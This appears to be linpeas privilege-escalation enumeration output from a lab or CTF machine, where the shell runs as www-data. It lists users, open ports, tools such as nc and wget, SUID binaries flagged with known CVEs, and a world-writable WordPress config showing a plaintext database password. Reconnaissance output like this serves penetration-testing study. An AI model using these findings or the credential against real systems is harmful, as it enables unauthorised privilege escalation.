org.freedesktop.DBus              1 systemd         root             -             init.scope                  -       -
org.freedesktop.ModemManager1  1123 ModemManager    root             :1.8          ModemManager.service        -       -
org.freedesktop.PackageKit        - -               -                (activatable) -                           -       -
org.freedesktop.PolicyKit1     1060 polkitd         root             :1.4          polkit.service              -       -
org.freedesktop.UDisks2        1075 udisksd         root             :1.6          udisks2.service             -       -
org.freedesktop.UPower         1518 upowerd         root             :1.15         upower.service              -       -
org.freedesktop.bolt              - -               -                (activatable) -                           -       -
org.freedesktop.fwupd          1440 fwupd           root             :1.14         fwupd.service               -       -
org.freedesktop.hostname1         - -               -                (activatable) -                           -       -
org.freedesktop.locale1           - -               -                (activatable) -                           -       -
org.freedesktop.login1         1072 systemd-logind  root             :1.7          systemd-logind.service      -       -
org.freedesktop.network1        935 systemd-network systemd-network  :1.1          systemd-networkd.service    -       -
org.freedesktop.resolve1        937 systemd-resolve systemd-resolve  :1.3          systemd-resolved.service    -       -
org.freedesktop.systemd1          1 systemd         root             :1.0          init.scope                  -       -
org.freedesktop.thermald          - -               -                (activatable) -                           -       -
org.freedesktop.timedate1         - -               -                (activatable) -                           -       -
org.freedesktop.timesync1       850 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service   -       -


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                 
                              ╚═════════════════════╝                                                               
╔══════════╣ Hostname, hosts and DNS
dora                                                                                                                
127.0.0.1 localhost dora

nameserver 127.0.0.53
options edns0 trust-ad

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                 
link-local 169.254.0.0
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.76.16  netmask 255.255.255.0  broadcast 192.168.76.255
        ether 00:50:56:bf:98:7a  txqueuelen 1000  (Ethernet)
        RX packets 336701  bytes 69118040 (69.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 298786  bytes 65075073 (65.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 5315  bytes 475858 (475.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5315  bytes 475858 (475.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                       
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                  
                                                                                                                    


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                 
                               ╚═══════════════════╝                                                                
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                            
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                               

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                        
netpgpkeys Not Found
netpgp Not Found                                                                                                    
                                                                                                                    
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                    
                                                                                                                    
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                              
ptrace protection is enabled (1)                                                                                    
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2          
                                                                                                                    
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                     

╔══════════╣ Users with console
dora:x:1000:1000::/home/dora:/bin/sh                                                                                
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                              
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(landscape) gid=115(landscape) groups=115(landscape)
uid=110(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=111(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=112(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=113(fwupd-refresh) gid=117(fwupd-refresh) groups=117(fwupd-refresh)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=998(lxd) gid=100(users) groups=100(users)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)

╔══════════╣ Login now
 04:01:58 up  1:35,  0 users,  load average: 0.19, 0.05, 0.02                                                       
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
reboot   system boot  Thu Apr  6 13:28:00 2023   still running                         0.0.0.0                      
root     tty1         Thu Apr  6 09:54:25 2023 - down                      (00:00)     0.0.0.0
reboot   system boot  Thu Apr  6 09:54:01 2023 - Thu Apr  6 09:54:53 2023  (00:00)     0.0.0.0
root     tty1         Thu Apr  6 05:15:19 2023 - down                      (00:00)     0.0.0.0
reboot   system boot  Thu Apr  6 05:08:30 2023 - Thu Apr  6 05:15:54 2023  (00:07)     0.0.0.0
reboot   system boot  Thu Apr  6 03:34:28 2023 - Thu Apr  6 04:01:59 2023  (00:27)     0.0.0.0

wtmp begins Thu Apr  6 03:33:35 2023

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                   
root             tty1                      Thu Apr  6 09:54:25 +0000 2023

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)                                                                                              
                                                                                                                    
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                    


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                  
                             ╚══════════════════════╝                                                               
╔══════════╣ Useful software
/usr/bin/base64                                                                                                     
/usr/bin/curl
/snap/bin/lxc
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/php
/usr/bin/ping
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
                                                                                                                    
╔══════════╣ Searching mysql credentials and exec
                                                                                                                    
╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.41 (Ubuntu)                                                              
Server built:   2023-03-08T17:32:54
httpd Not Found
                                                                                                                    
Nginx version: nginx Not Found
                                                                                                                    
/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Apr  6 03:30 /etc/apache2/sites-enabled                                                 
drwxr-xr-x 2 root root 4096 Apr  6 03:30 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Apr  6 03:30 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf                                                                                                               
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


lrwxrwxrwx 1 root root 35 Apr  6 03:30 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf                                                                                                               
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 72941 Feb 23 12:43 /etc/php/7.4/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 72539 Feb 23 12:43 /etc/php/7.4/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-rw-rw- 1 www-data www-data 3301 Apr 11 03:33 /var/www/html/wp-config.php                                        
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'root' );
define( 'DB_PASSWORD', 'Password123' );
define( 'DB_HOST', '192.168.49.76:3306' );

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Aug 16  2022 /usr/share/doc/rsync/examples/rsyncd.conf                                  
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                
drwxr-xr-x 2 root root 4096 Aug 31  2022 /etc/ldap


╔══════════╣ Searching ssl/ssh files
ChallengeResponseAuthentication no                                                                                  
UsePAM yes
        PasswordAuthentication no
══╣ Some certificates were found (out limited):
/etc/pki/fwupd-metadata/LVFS-CA.pem                                                                                 
/etc/pki/fwupd/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/snap/core20/1611/etc/ssl/certs/ACCVRAIZ1.pem
/snap/core20/1611/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/snap/core20/1611/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/snap/core20/1611/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/snap/core20/1611/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/snap/core20/1611/etc/ssl/certs/AffirmTrust_Commercial.pem
/snap/core20/1611/etc/ssl/certs/AffirmTrust_Networking.pem
/snap/core20/1611/etc/ssl/certs/AffirmTrust_Premium.pem
/snap/core20/1611/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/snap/core20/1611/etc/ssl/certs/Amazon_Root_CA_1.pem
/snap/core20/1611/etc/ssl/certs/Amazon_Root_CA_2.pem
/snap/core20/1611/etc/ssl/certs/Amazon_Root_CA_3.pem
/snap/core20/1611/etc/ssl/certs/Amazon_Root_CA_4.pem
/snap/core20/1611/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/snap/core20/1611/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/snap/core20/1611/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/snap/core20/1611/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
4748PSTORAGE_CERTSBIN

══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket                                                         
/etc/systemd/user/sockets.target.wants/gpg-agent.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                      
Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                    


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Apr  6 03:29 /etc/pam.d                                                                 
-rw-r--r-- 1 root root 2133 Mar 30  2022 /etc/pam.d/sshd




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions                              
tmux 3.0a                                                                                                           


/tmp/tmux-33
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3787 Mar  3 08:48 /etc/cloud/cloud.cfg                                                       
     lock_passwd: True
-rw-r--r-- 1 root root 3674 Jun 15  2022 /snap/core20/1611/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3786 Dec  8 16:45 /snap/core20/1852/etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 200 Aug  5  2022 /snap/core20/1611/usr/share/keyrings                                        
drwxr-xr-x 2 root root 200 Mar  8 08:46 /snap/core20/1852/usr/share/keyrings
drwxr-xr-x 2 root root 4096 Apr  6 03:28 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                      
passwd file: /etc/passwd
passwd file: /snap/core20/1611/etc/pam.d/passwd
passwd file: /snap/core20/1611/etc/passwd
passwd file: /snap/core20/1611/usr/share/bash-completion/completions/passwd
passwd file: /snap/core20/1611/usr/share/lintian/overrides/passwd
passwd file: /snap/core20/1611/var/lib/extrausers/passwd
passwd file: /snap/core20/1852/etc/pam.d/passwd
passwd file: /snap/core20/1852/etc/passwd
passwd file: /snap/core20/1852/usr/share/bash-completion/completions/passwd
passwd file: /snap/core20/1852/usr/share/lintian/overrides/passwd
passwd file: /snap/core20/1852/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                        
gpg Not Found
netpgpkeys Not Found                                                                                                
netpgp Not Found                                                                                                    
                                                                                                                    
-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core20/1611/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core20/1611/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core20/1611/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core20/1611/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core20/1611/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core20/1852/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core20/1852/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core20/1852/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core20/1852/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core20/1852/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 3267 Jul  4  2022 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 2247 Feb 28 19:17 /usr/share/keyrings/ubuntu-advantage-cc-eal.gpg
-rw-r--r-- 1 root root 2274 Feb 28 19:17 /usr/share/keyrings/ubuntu-advantage-cis.gpg
-rw-r--r-- 1 root root 2236 Feb 28 19:17 /usr/share/keyrings/ubuntu-advantage-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Feb 28 19:17 /usr/share/keyrings/ubuntu-advantage-esm-infra-trusty.gpg
-rw-r--r-- 1 root root 2275 Feb 28 19:17 /usr/share/keyrings/ubuntu-advantage-fips.gpg
-rw-r--r-- 1 root root 2250 Feb 28 19:17 /usr/share/keyrings/ubuntu-advantage-realtime-kernel.gpg
-rw-r--r-- 1 root root 2235 Feb 28 19:17 /usr/share/keyrings/ubuntu-advantage-ros.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 13  2020 /usr/share/popularity-contest/debian-popcon.gpg
-rw-r--r-- 1 root root 2236 Apr 11 02:29 /var/lib/ubuntu-advantage/apt-esm/etc/apt/trusted.gpg.d/ubuntu-advantage-esm-apps.gpg



╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 813 Feb  2  2020 /snap/core20/1611/usr/share/bash-completion/completions/postfix             

-rw-r--r-- 1 root root 813 Feb  2  2020 /snap/core20/1852/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 813 Feb  2  2020 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                    

-rw-r--r-- 1 root root 69 Feb 23 12:43 /etc/php/7.4/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Feb 23 12:43 /usr/share/php7.4-common/common/ftp.ini






╔══════════╣ Analyzing Bind Files (limit 70)
-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind                                 
-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind



╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc                                                          
-rw-r--r-- 1 dora dora 3771 Feb 25  2020 /home/dora/.bashrc
-rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1611/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1852/etc/skel/.bashrc





-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
-rw-r--r-- 1 dora dora 807 Feb 25  2020 /home/dora/.profile
-rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1611/etc/skel/.profile
-rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1852/etc/skel/.profile






                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════                                 
                               ╚═══════════════════╝                                                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                    
strings Not Found                                                                                                   
-rwsr-xr-x 1 root root 84K Nov 29 11:53 /snap/core20/1852/usr/bin/chfn  --->  SuSE_9.3/10                           
-rwsr-xr-x 1 root root 52K Nov 29 11:53 /snap/core20/1852/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Nov 29 11:53 /snap/core20/1852/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1852/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                            
-rwsr-xr-x 1 root root 44K Nov 29 11:53 /snap/core20/1852/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Nov 29 11:53 /snap/core20/1852/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                 
-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1852/usr/bin/su
-rwsr-xr-x 1 root root 163K Jan 16 13:06 /snap/core20/1852/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                                                                  
-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1852/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Oct 25 13:09 /snap/core20/1852/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Mar 30  2022 /snap/core20/1852/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 84K Mar 14  2022 /snap/core20/1611/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Mar 14  2022 /snap/core20/1611/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Mar 14  2022 /snap/core20/1611/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1611/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                            
-rwsr-xr-x 1 root root 44K Mar 14  2022 /snap/core20/1611/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Mar 14  2022 /snap/core20/1611/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                 
-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1611/usr/bin/su
-rwsr-xr-x 1 root root 163K Jan 19  2021 /snap/core20/1611/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                                                                  
-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1611/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Apr 29  2022 /snap/core20/1611/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Mar 30  2022 /snap/core20/1611/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 121K Feb 22 15:11 /snap/snapd/18596/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                                     
-rwsr-xr-- 1 root messagebus 51K Oct 25 13:09 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 144K Dec  1 08:52 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                                                      
-rwsr-xr-x 1 root root 463K Mar 30  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 52K Nov 29 11:53 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 67K Feb  7  2022 /usr/bin/su
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 84K Nov 29 11:53 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 31K Feb 21  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)                                                                                                                
-rwsr-xr-x 1 root root 39K Feb  7  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 163K Jan 16 13:06 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 67K Nov 29 11:53 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                  
-rwsr-xr-x 1 root root 44K Nov 29 11:53 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 55K Feb  7  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                             
-rwsr-xr-x 1 root root 87K Nov 29 11:53 /usr/bin/gpasswd

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                    
-rwxr-sr-x 1 root shadow 83K Nov 29 11:53 /snap/core20/1852/usr/bin/chage                                           
-rwxr-sr-x 1 root shadow 31K Nov 29 11:53 /snap/core20/1852/usr/bin/expiry
-rwxr-sr-x 1 root crontab 343K Mar 30  2022 /snap/core20/1852/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K Feb  7  2022 /snap/core20/1852/usr/bin/wall
-rwxr-sr-x 1 root shadow 43K Feb  2 09:22 /snap/core20/1852/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Feb  2 09:22 /snap/core20/1852/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 83K Mar 14  2022 /snap/core20/1611/usr/bin/chage
-rwxr-sr-x 1 root shadow 31K Mar 14  2022 /snap/core20/1611/usr/bin/expiry
-rwxr-sr-x 1 root crontab 343K Mar 30  2022 /snap/core20/1611/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K Feb  7  2022 /snap/core20/1611/usr/bin/wall
-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /snap/core20/1611/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /snap/core20/1611/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root utmp 15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 83K Nov 29 11:53 /usr/bin/chage
-rwxr-sr-x 1 root tty 35K Feb  7  2022 /usr/bin/wall
-rwxr-sr-x 1 root shadow 31K Nov 29 11:53 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 343K Mar 30  2022 /usr/bin/ssh-agent
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 43K Feb  2 09:22 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 43K Feb  2 09:22 /usr/sbin/pam_extrausers_chkpwd

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so                                            
/etc/ld.so.conf                                                                                                     
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                     
Current env capabilities:                                                                                           
Current: =
Current proc capabilities:
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
